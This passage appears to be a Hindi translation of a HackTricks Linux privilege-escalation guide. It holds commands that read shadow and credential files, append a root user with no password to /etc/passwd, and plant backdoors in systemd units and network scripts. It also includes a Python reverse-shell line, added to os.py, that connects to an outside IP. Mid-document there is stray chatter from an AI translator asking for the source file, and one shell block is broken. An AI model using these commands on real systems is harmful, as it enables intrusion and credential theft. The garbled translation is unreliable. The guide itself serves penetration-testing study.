फ़ाइल `/etc/profile` और `/etc/profile.d/` के तहत फ़ाइलें **स्क्रिप्ट्स हैं जो तब निष्पादित होती हैं जब कोई उपयोगकर्ता नया shell चलाता है**। इसलिए, यदि आप उनमें से किसी को **लिख या संशोधित कर सकते हैं तो आप escalate privileges कर सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब प्रोफ़ाइल स्क्रिप्ट मिलती है तो आपको इसे **संवेदनशील विवरण** के लिए जाँचना चाहिए।

### Passwd/Shadow Files

OS पर निर्भर करते हुए `/etc/passwd` और `/etc/shadow` फाइलें अलग नाम से मौजूद हो सकती हैं या कोई बैकअप हो सकता है। इसलिए यह अनुशंसा की जाती है कि आप **उन सभी को खोजें** और **जाँचें कि आप इन्हें पढ़ सकते हैं या नहीं** ताकि आप देख सकें **क्या फाइलों के अंदर hashes हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप **password hashes** `/etc/passwd` (या समतुल्य) फ़ाइल के अंदर पा सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित कमांडों में से किसी एक से एक password जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
कृपया src/linux-hardening/privilege-escalation/README.md की सामग्री चिपकाएँ ताकि मैं उसे हिंदी में अनुवाद कर सकूँ। साथ ही पुष्टि करें कि क्या आप चाहते हैं कि मैं अनुवादित फ़ाइल में user `hacker` जोड़ूँ और एक जेनरेट किया हुआ password भी शामिल करूँ — अगर हाँ, तो क्या वह पासवर्ड प्लेसहोल्डर होना चाहिए या आपको एक वास्तविक जेनरेट किया हुआ पासवर्ड चाहिए?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक डमी उपयोगकर्ता जोड़ने के लिए निम्न पंक्तियों का उपयोग कर सकते हैं.\
चेतावनी: इससे मशीन की वर्तमान सुरक्षा कमजोर पड़ सकती है.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म पर `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको यह जांचना चाहिए कि क्या आप **कुछ संवेदनशील फाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सर्विस कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat service configuration file** को संशोधित कर सकते हैं, तो आप इन लाइनों को बदल सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat शुरू होने पर चलाया जाएगा।

### फ़ोल्डरों की जाँच करें

निम्नलिखित फ़ोल्डरों में बैकअप या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप अंतिम को पढ़ नहीं पाएंगे लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड रखने वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें, यह **कई संभावित फ़ाइलों को खोजता है जिनमें पासवर्ड हो सकते हैं**।\
**एक और दिलचस्प टूल** जिसे आप इसके लिए उपयोग कर सकते हैं है: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक open source application है जिसका उपयोग Windows, Linux & Mac पर स्थानीय कंप्यूटर में संग्रहीत कई पासवर्ड निकालने के लिए किया जाता है।

### लॉग्स

यदि आप लॉग्स पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अजीब लॉग होगा, उतना ही संभवतः वह अधिक दिलचस्प होगा।\
इसके अलावा, कुछ **"bad"** configured (backdoored?) **audit logs** आपको audit logs के अंदर पासवर्ड **रिकॉर्ड** करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में बताया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग्स पढ़ने के लिए **लॉग्स पढ़ने वाले समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत मददगार होगा।

### शेल फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

You should also check for files containing the word "**password**" in its **name** or inside the **content**, and also check for IPs and emails inside logs, or hashes regexps.\
आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके नाम में या उनके कंटेंट में शब्द "**password**" मौजूद हो, और साथ ही logs के अंदर IPs और emails या hashes के regexps भी चेक करें।\
मैं यहाँ यह सब कैसे करना है इसकी सूची नहीं दे रहा हूँ लेकिन यदि आप रुचि रखते हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) कौन-कौन से last checks perform करता है.

## लिखने योग्य फ़ाइलें

### Python library hijacking

यदि आप जानते हैं कि कोई python script किस **कहाँ से** execute होने वाली है और आप उस फ़ोल्डर में **लिख** सकते हैं या आप **python libraries** को **modify** कर सकते हैं, तो आप OS library को modify करके उसे backdoor कर सकते हैं (यदि आप उस जगह पर लिख सकते हैं जहाँ python script execute होगा, तो os.py library को copy और paste कर लें)।

**To backdoor the library** करने के लिए बस os.py library के अंत में निम्नलिखित लाइन जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate का शोषण

`logrotate` में एक कमज़ोरी ऐसी है जिससे किसी log फ़ाइल या उसके parent directories पर **write permissions** रखने वाले उपयोगकर्ता संभावित रूप से privileges escalate कर सकते हैं। ऐसा इसलिए है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, को arbitrary फ़ाइलें execute करने के लिए manipulate किया जा सकता है, खासकर उन डायरेक्टरीज़ में जैसे _**/etc/bash_completion.d/**_. यह ज़रूरी है कि permissions केवल _/var/log_ में ही न देखें बल्कि उन किसी भी डायरेक्टरी में भी देखें जहाँ log rotation लागू है।

> [!TIP]
> यह कमज़ोरी `logrotate` संस्करण `3.18.0` और उससे पुराने को प्रभावित करती है

कमज़ोरी के बारे में अधिक विस्तृत जानकारी इस पेज पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमज़ोरी का exploit करने के लिए [**logrotten**](https://github.com/whotwagner/logrotten) का उपयोग कर सकते हैं।

यह कमज़ोरी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के बहुत समान है, इसलिए जब भी आप पाते हैं कि आप logs बदल सकते हैं, तो देखिए कि कौन उन logs को manage कर रहा है और जांचें कि क्या आप symlinks के ज़रिये logs को बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**कमज़ोरी संदर्भ:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारणवश कोई उपयोगकर्ता _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट **write** करने में सक्षम है **या** कोई मौजूदा स्क्रिप्ट **adjust** कर सकता है, तो आपकी **system is pwned**।

Network scripts, उदाहरण के लिए _ifcg-eth0_, नेटवर्क कनेक्शनों के लिए उपयोग होते हैं। ये बिल्कुल .INI फाइलों की तरह दिखते हैं। हालांकि, इन्हें Linux में Network Manager (dispatcher.d) द्वारा ~sourced~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` attribute को सही तरीके से handle नहीं किया जा रहा था। यदि नाम में **white/blank space** है तो system उस white/blank space के बाद वाला भाग execute करने की कोशिश करता है। इसका मतलब यह है कि **पहले blank space के बाद का सब कुछ root के रूप में execute होता है**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें Network और /bin/id_ के बीच रिक्त स्थान_)

### **init, init.d, systemd, और rc.d**

निर्देशिका `/etc/init.d` System V init (SysVinit) के लिए **scripts** का घर है, जो एक **classic Linux service management system** है। इसमें `start`, `stop`, `restart`, और कभी-कभी `reload` सेवाओं के लिए scripts शामिल होते हैं। इन्हें सीधे या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से निष्पादित किया जा सकता है। Redhat systems में वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया एक नया **service management** है और service management कार्यों के लिए configuration files का उपयोग करता है। Upstart पर संक्रमण के बावजूद, Upstart में मौजूद compatibility layer के कारण SysVinit scripts अभी भी Upstart configurations के साथ उपयोग किए जाते हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरा है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत फीचर प्रदान करता है। यह फ़ाइलों को वितरण पैकेजों के लिए `/usr/lib/systemd/` और प्रशासक संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल हो जाती है।

## अन्य तरकीबें

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को userspace manager के लिए expose करने हेतु syscall को hook करते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager का impersonate करने और पहले से-rooted devices पर root तक escalate करने में सक्षम बना सकता है। और exploitation विवरण यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel सुरक्षा उपाय

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
